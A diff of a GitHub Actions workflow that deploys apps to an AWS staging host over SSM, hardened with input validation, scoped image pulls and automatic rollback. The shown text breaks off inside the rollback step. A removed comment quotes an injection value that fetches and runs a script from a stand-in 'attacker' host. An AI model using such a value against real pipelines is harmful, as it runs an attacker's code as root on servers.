@@ -2,41 +2,106 @@ name: Reusable Staging Deploy
 
 # Deploys one application to the staging host.
 #
-# Two decisions here differ from the existing deploy workflows, and both exist
-# to make staging DISCARDABLE -- destroyable on a Friday, rebuilt on a Monday,
-# with no human in the loop.
+#   1. The host is found BY TAG, never by IP or instance id.
+#   2. Delivery is via SSM, not SSH. A fresh host registers within ~1 minute of
+#      boot -- no key to create, distribute or rotate.
+#   3. Auth is OIDC. No long-lived AWS keys.
 #
-#   1. The host is found BY TAG, never by IP or instance id. A rebuilt host has
-#      a new id and a new address; anything hardcoded breaks the moment staging
-#      is recreated, which is exactly when it must not break.
+# SECURITY NOTE ON SHELL HANDLING. Caller-controlled inputs are NEVER written as
+# ${{ inputs.* }} inside a run: body. They are bound to step env: and referenced
+# as "$VAR". The remote script is a QUOTED heredoc (no runner-side expansion)
+# prefixed by a printf %q prelude. This matters because the deploy runs on a
+# non-ephemeral self-hosted runner shared with workflows holding static
+# production AWS keys and the production SSH key.
 #
-#   2. Delivery is via SSM, not SSH. A fresh host registers with SSM through its
-#      instance profile within about a minute of boot -- no key pair to create,
-#      distribute or rotate, and every command is recorded in CloudTrail. The
-#      appleboy/ssh-action pattern used elsewhere needs a key on a host that
-#      does not exist yet.
-#
-# Auth is OIDC. No long-lived AWS keys in repository secrets.
+# NEW INPUTS, all default-off:
+#   sync-files       push git-tracked files to the host before compose runs
+#   ecr-registry     log the host into ECR via its instance role
+#   pull-services    which services `docker compose pull` may touch
+#   create-volumes   create named volumes if absent (rebuild bootstrap)
+#   require-volumes  assert named volumes exist
+#   image-refs       <service>/<VAR>=<image-ref> triples exported before compose
+#   assert-image-arch  refuse to start if image arch != host arch
+#   rollback-on-failure  restore the previous image refs if health fails
 
 on:
   workflow_call:
     inputs:
       app-name:
-        description: "Application name. Must match the Name tag prefix of its compose directory under /opt/seolith/staging/."
+        description: "Directory name under /opt/seolith/staging/. NOT the container prefix."
         required: true
         type: string
       compose-files:
         description: >-
           Space-separated compose files, applied in order, relative to the app
-          directory. Most apps here use OVERLAYS -- pto-admin's
-          docker-compose.staging.yml declares an `api` service with no image or
-          build, so it only works layered over the base docker-compose.yml.
-          Passing the overlay alone fails with a missing-image error.
+          directory. Compose merging cannot DELETE a key: if a base file gives a
+          service `build:`, no overlay removes it. A service that must pull
+          rather than build needs a standalone file.
         required: false
         type: string
         default: "docker-compose.yml docker-compose.staging.yml"
+      sync-files:
+        description: >-
+          Space-separated repo-relative paths copied from the checkout to the app
+          directory before compose runs, base64 over SSM. ALLOWLIST: only
+          .yml/.yaml/.conf/.sql are accepted. Traversing/absolute paths, .env,
+          and files containing PEM blocks are refused.
+        required: false
+        type: string
+        default: ""
+      ecr-registry:
+        description: >-
+          e.g. 478087977376.dkr.ecr.us-east-2.amazonaws.com. When set the host
+          logs in with `aws ecr get-login-password` via its instance role (no
+          stored secret), the pull becomes fatal on failure, and the token is
+          discarded with `docker logout` afterwards.
+        required: false
+        type: string
+        default: ""
+      pull-services:
+        description: >-
+          Space-separated service names the pull step may touch. REQUIRED when
+          ecr-registry is set. A bare `docker compose pull` re-resolves floating
+          tags on data services too -- verified on Compose v5.3.1 that it targets
+          every service and that pull_policy:missing does not exempt them. Empty
+          preserves the old best-effort whole-project pull.
+        required: false
+        type: string
+        default: ""
+      create-volumes:
+        description: >-
+          Space-separated volume names created if absent, before anything else.
+          Idempotent. Needed because rebuild-staging.yml triggers app deploys
+          with no inputs and cannot run manual commands on a fresh host.
+        required: false
+        type: string
+        default: ""
+      require-volumes:
+        description: "Space-separated volume names that must exist. Legibility check; the real guarantee is `external: true` with a literal name in compose."
+        required: false
+        type: string
+        default: ""
+      image-refs:
+        description: >-
+          Space-separated <service>/<VAR>=<image-ref> triples exported before
+          compose runs, e.g. api/PTOADMIN_API_IMAGE=<registry>/<repo>@sha256:...
+          Refs must be digests when ecr-registry is set. The service name lets
+          the deploy record the PREVIOUS ref for automatic rollback.
+        required: false
+        type: string
+        default: ""
+      assert-image-arch:
+        description: "Compare each pulled image's architecture to the host's and abort BEFORE `up -d` on a mismatch."
+        required: false
+        type: boolean
+        default: false
+      rollback-on-failure:
+        description: "If the health check fails, restore the image refs recorded before this deploy and re-run `up -d`."
+        required: false
+        type: boolean
+        default: false
       image-tag:
-        description: "Image tag to deploy. Defaults to the triggering commit."
+        description: "Legacy IMAGE_TAG export for callers whose compose reads it. Defaults to the short commit."
         required: false
         type: string
         default: ""
@@ -50,7 +115,6 @@ on:
         type: number
         default: 180
       environment-tag:
-        description: "Value of the Environment tag identifying the target host."
         required: false
         type: string
         default: "staging"
@@ -60,9 +124,8 @@ on:
         default: "us-east-2"
       runs-on:
         description: >-
-          GitHub-hosted by default, deliberately. Staging rebuild must not
-          depend on self-hosted runners in an office; if that hardware is down,
-          the rebuild button has to still work.
+          GitHub-hosted by default. Note the org's spending limit is $0, so
+          callers currently override this with the self-hosted pool.
         required: false
         type: string
         default: '["ubuntu-latest"]'
@@ -78,13 +141,92 @@ permissions:
 jobs:
   deploy:
     runs-on: ${{ fromJSON(inputs.runs-on) }}
-    timeout-minutes: 20
+    timeout-minutes: 25
 
     steps:
-      - uses: actions/checkout@v5
+      # PIN THESE TO COMMIT SHAs BEFORE THE FIRST LIVE RUN -- see step 5 of the
+      # rollout. This job holds OIDC credentials on a non-ephemeral runner.
+      - uses: actions/checkout@v5 # TODO pin to SHA
+
+      # ---------------------------------------------------------------------
+      # Validate every caller-controlled input BEFORE it reaches a shell.
+      # ---------------------------------------------------------------------
+      - name: Validate inputs
+        env:
+          APP_NAME: ${{ inputs.app-name }}
+          COMPOSE_FILES: ${{ inputs.compose-files }}
+          SYNC_FILES: ${{ inputs.sync-files }}
+          ECR_REGISTRY: ${{ inputs.ecr-registry }}
+          PULL_SERVICES: ${{ inputs.pull-services }}
+          CREATE_VOLUMES: ${{ inputs.create-volumes }}
+          REQUIRE_VOLUMES: ${{ inputs.require-volumes }}
+          IMAGE_REFS: ${{ inputs.image-refs }}
+          IMAGE_TAG_IN: ${{ inputs.image-tag }}
+          HEALTH_URL: ${{ inputs.health-url }}
+        run: |
+          set -euo pipefail
+          die() { echo "::error::$*"; exit 1; }
+
+          printf '%s' "$APP_NAME" | grep -qE '^[a-z0-9][a-z0-9._-]{0,63}$' \
+            || die "app-name '$APP_NAME' is not a safe directory name"
+
+          for f in $COMPOSE_FILES; do
+            printf '%s' "$f" | grep -qE '^[A-Za-z0-9][A-Za-z0-9._/-]*$' || die "compose-files: unsafe path '$f'"
+            case "$f" in *..*) die "compose-files: traversing path '$f'" ;; esac
+          done
+
+          for f in $SYNC_FILES; do
+            printf '%s' "$f" | grep -qE '^[A-Za-z0-9][A-Za-z0-9._/-]*$' || die "sync-files: unsafe path '$f'"
+            case "$f" in
+              *..*) die "sync-files: traversing path '$f'" ;;
+              *.yml|*.yaml|*.conf|*.sql) : ;;
+              *) die "sync-files: '$f' is not an allowed type (.yml .yaml .conf .sql). SSM command parameters are recorded verbatim in CloudTrail; base64 is encoding, not protection. Stage anything else in S3 and fetch it host-side." ;;
+            esac
+            [ -f "$f" ] || die "sync-files: '$f' is not a regular file in the checkout"
+            if grep -qE -- '-----BEGIN [A-Z ]*(PRIVATE KEY|CERTIFICATE)-----' "$f"; then
+              die "sync-files: '$f' contains a PEM block. Refusing to write key material into an SSM command document."
+            fi
+          done
+
+          if [ -n "$ECR_REGISTRY" ]; then
+            printf '%s' "$ECR_REGISTRY" | grep -qE '^[0-9]{12}\.dkr\.ecr\.[a-z0-9-]+\.amazonaws\.com$' \
+              || die "ecr-registry '$ECR_REGISTRY' is not an ECR registry host"
+            [ -n "$PULL_SERVICES" ] \
+              || die "pull-services is required when ecr-registry is set. A bare 'docker compose pull' would re-resolve floating tags on data services and can upgrade a database engine underneath its volume."
+          fi
+
+          for s in $PULL_SERVICES; do
+            printf '%s' "$s" | grep -qE '^[a-z0-9][a-z0-9._-]*$' || die "pull-services: unsafe service name '$s'"
+          done
+
+          for v in $CREATE_VOLUMES $REQUIRE_VOLUMES; do
+            printf '%s' "$v" | grep -qE '^[A-Za-z0-9][A-Za-z0-9_.-]*$' || die "volume name '$v' is unsafe"
+          done
+
+          for r in $IMAGE_REFS; do
+            printf '%s' "$r" | grep -qE '^[a-z0-9][a-z0-9._-]*/[A-Z][A-Z0-9_]*=[A-Za-z0-9][A-Za-z0-9._/-]*(:[A-Za-z0-9._-]+|@sha256:[0-9a-f]{64})$' \
+              || die "image-refs: '$r' is not <service>/<VAR>=<image-ref>"
+            if [ -n "$ECR_REGISTRY" ]; then
+              case "$r" in
+                *@sha256:*) : ;;
+                *) die "image-refs: '$r' must be a DIGEST when ecr-registry is set. Tags can age out of the lifecycle policy and be re-pushed by a later build; digests cannot." ;;
+              esac
+            fi
+          done
+
+          if [ -n "$IMAGE_TAG_IN" ]; then
+            printf '%s' "$IMAGE_TAG_IN" | grep -qE '^[A-Za-z0-9_][A-Za-z0-9._-]{0,127}$' \
+              || die "image-tag '$IMAGE_TAG_IN' is not a valid Docker tag"
+          fi
+
+          if [ -n "$HEALTH_URL" ]; then
+            printf '%s' "$HEALTH_URL" | grep -qE '^https?://[A-Za-z0-9._~:/?#@!$&()*+,;=%-]+$' \
+              || die "health-url is not a plain http(s) URL"
+          fi
+          echo "inputs ok"
 
       - name: Configure AWS credentials (OIDC)
-        uses: aws-actions/configure-aws-credentials@v4
+        uses: aws-actions/configure-aws-credentials@v4 # TODO pin to SHA
         with:
           role-to-assume: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
           aws-region: ${{ inputs.aws-region }}
@@ -93,204 +235,358 @@ jobs:
       - name: Resolve the staging host by tag
         id: host
         env:
-          ENVIRONMENT_TAG: ${{ inputs.environment-tag }}
+          ENV_TAG: ${{ inputs.environment-tag }}
         run: |
           set -euo pipefail
-          # Deliberately NOT an instance id. Whatever host currently carries the
-          # staging tag is the target, including one created ten minutes ago.
           ID=$(aws ec2 describe-instances \
-                --filters "Name=tag:Environment,Values=$ENVIRONMENT_TAG" \
+                --filters "Name=tag:Environment,Values=$ENV_TAG" \
                           "Name=tag:Role,Values=app-host" \
                           "Name=instance-state-name,Values=running" \
                 --query 'Reservations[].Instances[].InstanceId' --output text)
-
           COUNT=$(echo "$ID" | wc -w)
           if [ "$COUNT" -eq 0 ]; then
-            echo "::error::No running host tagged Environment=$ENVIRONMENT_TAG, Role=app-host. Run the staging Terraform first."
-            exit 1
+            echo "::error::No running host tagged Environment=$ENV_TAG, Role=app-host. Run the staging Terraform first."; exit 1
           fi
           if [ "$COUNT" -gt 1 ]; then
-            echo "::error::$COUNT hosts match. Refusing to guess: $ID"
-            exit 1
+            echo "::error::$COUNT hosts match. Refusing to guess: $ID"; exit 1
           fi
-
+          ARCH=$(aws ec2 describe-instances --instance-ids "$ID" \
+                  --query 'Reservations[0].Instances[0].Architecture' --output text)
           echo "instance-id=$ID" >> "$GITHUB_OUTPUT"
-          echo "Target: $ID"
+          echo "arch=$ARCH" >> "$GITHUB_OUTPUT"
+          echo "Target: $ID (architecture: $ARCH)"
 
       - name: Wait for SSM to be ready
+        env:
+          INSTANCE_ID: ${{ steps.host.outputs.instance-id }}
         run: |
           set -euo pipefail
-          # A freshly built host may not have registered yet. Waiting here is
-          # what lets a rebuild deploy immediately rather than failing once and
-          # needing a manual retry.
           for i in $(seq 1 30); do
             PING=$(aws ssm describe-instance-information \
-                    --filters "Key=InstanceIds,Values=${{ steps.host.outputs.instance-id }}" \
+                    --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
                     --query 'InstanceInformationList[0].PingStatus' --output text 2>/dev/null || echo "None")
             [ "$PING" = "Online" ] && { echo "SSM online after ${i} attempt(s)"; exit 0; }
             sleep 10
           done
-          echo "::error::SSM did not come online within 5 minutes."
-          exit 1
+          echo "::error::SSM did not come online within 5 minutes."; exit 1
+
+      # ---------------------------------------------------------------------
+      # Build the remote script. Quoted heredoc + printf %q prelude, so no
+      # caller string is ever parsed as shell on the runner or on the host.
+      # ---------------------------------------------------------------------
+      - name: Compose the remote script
+        id: script
+        env:
+          APP_NAME: ${{ inputs.app-name }}
+          COMPOSE_FILES: ${{ inputs.compose-files }}
+          SYNC_FILES: ${{ inputs.sync-files }}
+          ECR_REGISTRY: ${{ inputs.ecr-registry }}
+          AWS_REGION_IN: ${{ inputs.aws-region }}
+          PULL_SERVICES: ${{ inputs.pull-services }}
+          CREATE_VOLUMES: ${{ inputs.create-volumes }}
+          REQUIRE_VOLUMES: ${{ inputs.require-volumes }}
+          IMAGE_REFS: ${{ inputs.image-refs }}
+          ASSERT_ARCH: ${{ inputs.assert-image-arch }}
+          IMAGE_TAG_IN: ${{ inputs.image-tag }}
+        run: |
+          set -euo pipefail
+          TAG="$IMAGE_TAG_IN"; [ -z "$TAG" ] && TAG="${GITHUB_SHA::7}"
+          APP_DIR="/opt/seolith/staging/$APP_NAME"
+
+          PRE="$RUNNER_TEMP/prelude.sh"
+          {
+            printf 'APP_DIR=%q\n'        "$APP_DIR"
+            printf 'COMPOSE_FILES=%q\n'  "$COMPOSE_FILES"
+            printf 'ECR_REGISTRY=%q\n'   "$ECR_REGISTRY"
+            printf 'AWS_REGION=%q\n'     "$AWS_REGION_IN"
+            printf 'PULL_SERVICES=%q\n'  "$PULL_SERVICES"
+            printf 'CREATE_VOLUMES=%q\n' "$CREATE_VOLUMES"
+            printf 'REQ_VOLUMES=%q\n'    "$REQUIRE_VOLUMES"
+            printf 'IMAGE_REFS=%q\n'     "$IMAGE_REFS"
+            printf 'ASSERT_ARCH=%q\n'    "$ASSERT_ARCH"
+            printf 'IMAGE_TAG=%q\n'      "$TAG"
+            # base64 output is [A-Za-z0-9+/=] only, so single quotes are safe.
+            for f in $SYNC_FILES; do
+              B=$(base64 -w0 < "$f" 2>/dev/null || base64 < "$f" | tr -d '\n')
+              printf "SYNC_PAYLOAD=\"\$SYNC_PAYLOAD %s:%s\"\n" "$f" "$B"
+            done
+          } > "$PRE"
+
+          BODY="$RUNNER_TEMP/body.sh"
+          cat > "$BODY" <<'REMOTE'
+          set -euo pipefail
+          mkdir -p "$APP_DIR"; cd "$APP_DIR"
+
+          # --- materialise git-tracked files -------------------------------
+          for entry in ${SYNC_PAYLOAD:-}; do
+            p="${entry%%:*}"; b="${entry#*:}"
+            mkdir -p "$(dirname "$p")"
+            printf '%s' "$b" | base64 -d > "$p.sync.tmp"
+            mv -f "$p.sync.tmp" "$p"     # atomic: a truncated transfer never
+            sha256sum "$p"                # lands where a bind mount expects a file
+          done
+
+          # --- compose flags ------------------------------------------------
+          FLAGS=""
+          for f in $COMPOSE_FILES; do
+            if [ ! -f "$f" ]; then
+              echo "MISSING_COMPOSE: $f not found in $APP_DIR" >&2; ls -1 "$APP_DIR" >&2; exit 2
+            fi
+            FLAGS="$FLAGS -f $f"
+          done
+
+          # --- image refs ---------------------------------------------------
+          # <service>/<VAR>=<ref>. Assert digests look like digests before use;
+          # the compose sentinel defaults exist only so `down` works by hand.
+          SERVICES_WITH_REFS=""
+          for r in ${IMAGE_REFS:-}; do
+            svc="${r%%/*}"; rest="${r#*/}"; var="${rest%%=*}"; ref="${rest#*=}"
+            case "$ref" in
+              *sha256:0000000000000000000000000000000000000000000000000000000000000000)
+                echo "SENTINEL_IMAGE_REF: $var resolved to the placeholder digest. Refusing to deploy." >&2; exit 6 ;;
+            esac
+            export "$var=$ref"
+            SERVICES_WITH_REFS="$SERVICES_WITH_REFS $svc"
+            echo "image ref: $svc -> $var=$ref"
+          done
+          export IMAGE_TAG
+
+          # --- record the rollback point BEFORE touching anything -----------
+          : > .deploy-previous-image-refs.tmp
+          for r in ${IMAGE_REFS:-}; do
+            svc="${r%%/*}"; rest="${r#*/}"; var="${rest%%=*}"
+            cid=$(docker compose $FLAGS ps -q "$svc" 2>/dev/null | head -1 || true)
+            if [ -n "$cid" ]; then
+              prev=$(docker inspect -f '{{.Config.Image}}' "$cid" 2>/dev/null || true)
+              [ -n "$prev" ] && echo "$svc/$var=$prev" >> .deploy-previous-image-refs.tmp
+            fi
+          done
+          if [ -s .deploy-previous-image-refs.tmp ]; then
+            mv -f .deploy-previous-image-refs.tmp .deploy-previous-image-refs
+            echo '--- rollback point recorded ---'; cat .deploy-previous-image-refs
+          else
+            rm -f .deploy-previous-image-refs.tmp
+            echo 'no previous containers; no rollback point recorded'
+          fi
+
+          # --- volumes ------------------------------------------------------
+          # create-volumes runs first so a rebuilt host is not permanently
+          # blocked. Creating an existing volume is a no-op.
+          for v in ${CREATE_VOLUMES:-}; do
+            docker volume inspect "$v" >/dev/null 2>&1 || {
+              echo "creating volume $v"; docker volume create "$v" >/dev/null; }
+          done
+          for v in ${REQ_VOLUMES:-}; do
+            docker volume inspect "$v" >/dev/null 2>&1 || {
+              echo "MISSING_VOLUME: $v does not exist and was not in create-volumes. Refusing to deploy." >&2; exit 4; }
+          done
+
+          # --- ECR login ----------------------------------------------------
+          if [ -n "${ECR_REGISTRY:-}" ]; then
+            aws ecr get-login-password --region "$AWS_REGION" \
+              | docker login --username AWS --password-stdin "$ECR_REGISTRY"
+          fi
+
+          docker compose $FLAGS config --quiet
+
+          # --- bind-source guard --------------------------------------------
+          # Catches the failure that does not announce itself: a missing bind
+          # source makes Docker create a DIRECTORY and the container starts broken.
+          if [ -n "${SYNC_PAYLOAD:-}" ]; then
+            BAD=""
+            for s in $(docker compose $FLAGS config 2>/dev/null | awk '$1=="source:" && $2 ~ /^\//{print $2}' | sort -u); do
+              if [ ! -e "$s" ]; then BAD="$BAD $s(absent)"
+              elif [ -d "$s" ] && printf '%s' "$s" | grep -qE '[.](conf|sql|ya?ml|json)$'; then BAD="$BAD $s(is-a-directory)"; fi
+            done
+            [ -n "$BAD" ] && { echo "BIND_SOURCE_PROBLEM:$BAD" >&2; exit 3; }
+            echo 'bind sources ok'
+          fi
+
+          echo '--- containers currently in this project ---'
+          docker compose $FLAGS ps -a --format '{{.Name}}\t{{.Image}}\t{{.Status}}' || true
+
+          # --- pull ----------------------------------------------------------
+          # SCOPED. A bare `docker compose pull` targets every service and
+          # pull_policy:missing does not exempt them, so it would re-resolve
+          # floating tags on postgres/redis and can move a database engine
+          # underneath its volume. It would also make every deploy depend on
+          # anonymous Docker Hub pulls from a single shared EC2 IP.
+          if [ -n "${PULL_SERVICES:-}" ]; then
+            docker compose $FLAGS pull $PULL_SERVICES
+          else
+            docker compose $FLAGS pull --quiet || true
+          fi
+
+          if [ -n "${ECR_REGISTRY:-}" ]; then
+            docker logout "$ECR_REGISTRY" >/dev/null 2>&1 || true
+          fi
+
+          # --- architecture guard -------------------------------------------
+          # Runs AFTER pull, BEFORE up. A mismatch becomes 'deploy refused,
+          # nothing stopped' instead of api and web both down with
+          # 'exec format error'.
+          if [ "${ASSERT_ARCH:-false}" = "true" ]; then
+            case "$(uname -m)" in
+              x86_64) HOST_ARCH=amd64 ;;
+              aarch64|arm64) HOST_ARCH=arm64 ;;
+              *) HOST_ARCH="" ;;
+            esac
+            if [ -n "$HOST_ARCH" ]; then
+              for svc in ${PULL_SERVICES:-}; do
+                ref=$(docker compose $FLAGS config --images "$svc" 2>/dev/null | head -1 || true)
+                [ -z "$ref" ] && continue
+                ia=$(docker image inspect -f '{{.Architecture}}' "$ref" 2>/dev/null || echo unknown)
+                if [ "$ia" != "unknown" ] && [ "$ia" != "$HOST_ARCH" ]; then
+                  echo "ARCH_MISMATCH: service '$svc' image $ref is $ia but this host is $HOST_ARCH ($(uname -m)). Refusing to start. Rebuild with the correct 'platform' input." >&2
+                  exit 5
+                fi
+                echo "arch ok: $svc = $ia"
+              done
+            else
+              echo "::notice::unrecognised host architecture $(uname -m); arch guard skipped"
+            fi
+          fi
+
+          docker compose $FLAGS up -d --remove-orphans
+          # Everything below is diagnostics and must never set the exit status.
+          docker compose $FLAGS ps || true
+          echo '--- deployed images ---'
+          docker compose $FLAGS images || true
+          echo 'DEPLOY_OK'
+          REMOTE
+
+          # Strip the heredoc's leading indentation, then join.
+          sed -i 's/^          //' "$BODY"
+          { echo 'set -euo pipefail'; echo 'SYNC_PAYLOAD=""'; cat "$PRE" "$BODY"; } > "$RUNNER_TEMP/remote.sh"
+
+          B64=$(base64 -w0 < "$RUNNER_TEMP/remote.sh" 2>/dev/null || base64 < "$RUNNER_TEMP/remote.sh" | tr -d '\n')
+          SIZE=${#B64}
+          echo "Encoded payload: ${SIZE} bytes"
+          if [ "$SIZE" -gt 90000 ]; then
+            echo "::error::Payload ${SIZE} bytes exceeds the 90 KB guard (SSM limit is 100 KB). Reduce sync-files; large assets belong in the image."; exit 1
+          fi
+          printf '{"commands":["echo %s | base64 -d | bash"]}' "$B64" > "$RUNNER_TEMP/ssm-deploy.json"
+
+          # Rollback script: sources the file the deploy just wrote on the host.
+          cat > "$RUNNER_TEMP/rollback.sh" <<'ROLLBACK'
+          set -euo pipefail
+          cd "$APP_DIR"
+          [ -f .deploy-previous-image-refs ] || { echo "NO_ROLLBACK_POINT" >&2; exit 7; }
+          FLAGS=""; for f in $COMPOSE_FILES; do FLAGS="$FLAGS -f $f"; done
+          while IFS= read -r r; do
+            rest="${r#*/}"; var="${rest%%=*}"; ref="${rest#*=}"
+            export "$var=$ref"; echo "restoring $var=$ref"
+          done < .deploy-previous-image-refs
+          docker compose $FLAGS up -d --remove-orphans
+          docker compose $FLAGS ps || true
+          echo 'ROLLBACK_OK'
+          ROLLBACK
+          sed -i 's/^          //' "$RUNNER_TEMP/rollback.sh"
+          { cat "$PRE"; cat "$RUNNER_TEMP/rollback.sh"; } > "$RUNNER_TEMP/remote-rollback.sh"
+          RB64=$(base64 -w0 < "$RUNNER_TEMP/remote-rollback.sh" 2>/dev/null || base64 < "$RUNNER_TEMP/remote-rollback.sh" | tr -d '\n')
+          printf '{"commands":["echo %s | base64 -d | bash"]}' "$RB64" > "$RUNNER_TEMP/ssm-rollback.json"
+
+          echo "image-tag=$TAG" >> "$GITHUB_OUTPUT"
 
       - name: Deploy
         id: deploy
-        # Inputs are bound to env, NEVER interpolated as ${{ }} into the script.
-        #
-        # This is a security boundary, not a style preference. GitHub substitutes
-        # ${{ }} as raw TEXT before bash ever sees the line, so a caller passing
-        #     image-tag: 'x"$(curl -s http://attacker/p | bash)"'
-        # got that text spliced into the runner's shell. Worse, the value was then
-        # baked into the CMD heredoc, base64'd, and executed AS ROOT on the staging
-        # host over SSM. Any of the nine repositories trusted by this workflow could
-        # reach a host in the account that also runs production.
-        #
-        # Bound through env, "$IMAGE_TAG" expands to a value and bash does not
-        # re-evaluate what comes out, so command substitution inside the value stays
-        # inert. The validation below then rejects it outright anyway.
         env:
-          IMAGE_TAG_IN: ${{ inputs.image-tag }}
+          INSTANCE_ID: ${{ steps.host.outputs.instance-id }}
           APP_NAME: ${{ inputs.app-name }}
-          COMPOSE_FILES: ${{ inputs.compose-files }}
+          TAG: ${{ steps.script.outputs.image-tag }}
         run: |
           set -euo pipefail
-
-          # Reject anything that is not a plain tag or path fragment BEFORE it can
-          # reach the host. Defence in depth: env binding stops execution on the
-          # runner, this stops the value being written into a script that root runs.
-          case "$IMAGE_TAG_IN" in
-            "" ) TAG="${GITHUB_SHA::7}" ;;
-            *[!A-Za-z0-9._-]* )
-              echo "::error::Refusing image-tag '$IMAGE_TAG_IN' -- only [A-Za-z0-9._-] permitted."
-              exit 1 ;;
-            * ) TAG="$IMAGE_TAG_IN" ;;
-          esac
-          case "$APP_NAME" in
-            ""|*[!A-Za-z0-9._-]* )
-              echo "::error::Refusing app-name '$APP_NAME' -- only [A-Za-z0-9._-] permitted."
-              exit 1 ;;
-          esac
-          case "$COMPOSE_FILES" in
-            ""|*[!A-Za-z0-9._/\ -]* )
-              echo "::error::Refusing compose-files '$COMPOSE_FILES' -- only [A-Za-z0-9._/-] and spaces permitted."
-              exit 1 ;;
-          esac
-
-          APP_DIR="/opt/seolith/staging/$APP_NAME"
-
-          # Idempotent by construction: creates the directory if absent, pulls,
-          # and brings the stack up. Assumes nothing already exists on the host.
-          CMD=$(cat <<EOF
-          set -euo pipefail
-          mkdir -p "$APP_DIR"
-          cd "$APP_DIR"
-          # Build the -f chain. Order matters: later files override earlier
-          # ones, so the base must come first.
-          FLAGS=""
-          for f in $COMPOSE_FILES; do
-            if [ ! -f "\$f" ]; then
-              echo "MISSING_COMPOSE: \$f not found in $APP_DIR" >&2
-              ls -1 "$APP_DIR" >&2
-              exit 2
-            fi
-            FLAGS="\$FLAGS -f \$f"
-          done
-
-          export IMAGE_TAG="$TAG"
-          docker compose \$FLAGS config --quiet
-          docker compose \$FLAGS pull --quiet || true
-          docker compose \$FLAGS up -d --remove-orphans
-          docker compose \$FLAGS ps
-          EOF
-          )
-
-          # Ship the script base64-encoded rather than embedding it in JSON.
-          #
-          # Two problems solved at once. The first version used `jq -Rs .` to
-          # escape the script; jq ships on GitHub-hosted runners but NOT on the
-          # self-hosted runner this workflow now uses, so it died with
-          # "jq: command not found" before sending anything. The second is that
-          # the script is full of quotes, newlines and $ signs -- exactly the
-          # characters that make hand-rolled JSON escaping fragile.
-          #
-          # base64 output is [A-Za-z0-9+/=] only, so it drops into a JSON string
-          # with no escaping at all, and printf can build the document safely.
-          # base64 is coreutils, present wherever bash is.
-          B64=$(printf '%s' "$CMD" | base64 -w0 2>/dev/null || printf '%s' "$CMD" | base64 | tr -d '\n')
-
-          PARAMS="$RUNNER_TEMP/ssm-params-$GITHUB_RUN_ID.json"
-          printf '{"commands":["echo %s | base64 -d | bash"]}' "$B64" > "$PARAMS"
-
           CMD_ID=$(aws ssm send-command \
-            --instance-ids "${{ steps.host.outputs.instance-id }}" \
+            --instance-ids "$INSTANCE_ID" \
             --document-name "AWS-RunShellScript" \
             --comment "deploy $APP_NAME @ $TAG" \
             --timeout-seconds 900 \
-            --parameters "file://$PARAMS" \
+            --parameters "file://$RUNNER_TEMP/ssm-deploy.json" \
             --query 'Command.CommandId' --output text)
-
           echo "command-id=$CMD_ID" >> "$GITHUB_OUTPUT"
-          aws ssm wait command-executed \
-            --command-id "$CMD_ID" \
-            --instance-id "${{ steps.host.outputs.instance-id }}" || true
-
-          STATUS=$(aws ssm get-command-invocation --command-id "$CMD_ID" \
-                    --instance-id "${{ steps.host.outputs.instance-id }}" \
-                    --query 'Status' --output text)
+          aws ssm wait command-executed --command-id "$CMD_ID" --instance-id "$INSTANCE_ID" || true
+          STATUS=$(aws ssm get-command-invocation --command-id "$CMD_ID" --instance-id "$INSTANCE_ID" --query 'Status' --output text)
           echo "--- stdout ---"
-          aws ssm get-command-invocation --command-id "$CMD_ID" \
-            --instance-id "${{ steps.host.outputs.instance-id }}" \
-            --query 'StandardOutputContent' --output text
+          aws ssm get-command-invocation --command-id "$CMD_ID" --instance-id "$INSTANCE_ID" --query 'StandardOutputContent' --output text
           if [ "$STATUS" != "Success" ]; then
             echo "--- stderr ---"
-            aws ssm get-command-invocation --command-id "$CMD_ID" \
-              --instance-id "${{ steps.host.outputs.instance-id }}" \
-              --query 'StandardErrorContent' --output text
-            echo "::error::Deploy failed with status $STATUS"
-            exit 1
+            aws ssm get-command-invocation --command-id "$CMD_ID" --instance-id "$INSTANCE_ID" --query 'StandardErrorContent' --output text
+            echo "::error::Deploy failed with status $STATUS"; exit 1
           fi
 
       - name: Health check
+        id: health
         if: inputs.health-url != ''
-        # Same boundary as the deploy step. A URL is data, not shell -- interpolated
-        # directly it is a second injection site reachable by any of the nine callers.
+        continue-on-error: true
         env:
           HEALTH_URL: ${{ inputs.health-url }}
-          HEALTH_TIMEOUT: ${{ inputs.health-timeout-seconds }}
-          APP_NAME: ${{ inputs.app-name }}
+          TIMEOUT: ${{ inputs.health-timeout-seconds }}
         run: |
           set -euo pipefail
-          case "$HEALTH_TIMEOUT" in ''|*[!0-9]*) echo "::error::health-timeout-seconds must be an integer."; exit 1 ;; esac
-          case "$HEALTH_URL" in
-            http://*|https://*) ;;
-            *) echo "::error::health-url must be an http(s) URL."; exit 1 ;;
-          esac
-          DEADLINE=$(( $(date +%s) + HEALTH_TIMEOUT ))
+          DEADLINE=$(( $(date +%s) + TIMEOUT ))
           until [ "$(date +%s)" -ge "$DEADLINE" ]; do
             CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 10 "$HEALTH_URL" || echo 000)
-            if [ "$CODE" -ge 200 ] && [ "$CODE" -lt 400 ]; then
-              echo "Healthy (HTTP $CODE)"
-              exit 0
-            fi
+            if [ "$CODE" -ge 200 ] && [ "$CODE" -lt 400 ]; then echo "Healthy (HTTP $CODE)"; exit 0; fi
             echo "waiting... (HTTP $CODE)"
             sleep 10
           done
-          echo "::error::$APP_NAME did not become healthy within ${HEALTH_TIMEOUT}s."
+          echo "::error::Did not become healthy within ${TIMEOUT}s."; exit 1
+
+      - name: Automatic rollback
+        id: rollback
+        if: inputs.rollback-on-failure && steps.health.outcome == 'failure'
+        env:
+          INSTANCE_ID: ${{ steps.host.outputs.instance-id }}
+          APP_NAME: ${{ inputs.app-name }}
+        run: |
+          set -euo pipefail
+          echo "::warning::Health check failed. Restoring the image refs recorded before this deploy."
+          CMD_ID=$(aws ssm send-command \
+            --instance-ids "$INSTANCE_ID" \
+            --document-name "AWS-RunShellScript" \
+            --comment "rollback $APP_NAME" \
+            --timeout-seconds 900 \
+            --parameters "file://$RUNNER_TEMP/ssm-rollback.json" \
+            --query 'Command.CommandId' --output text)
+          aws ssm wait command-executed --command-id "$CMD_ID" --instance-id "$INSTANCE_ID" || true
+          echo "--- rollback stdout ---"
+          aws ssm get-command-invocation --command-id "$CMD_ID" --instance-id "$INSTANCE_ID" --query 'StandardOutputContent' --output text
+          echo "--- rollback stderr ---"
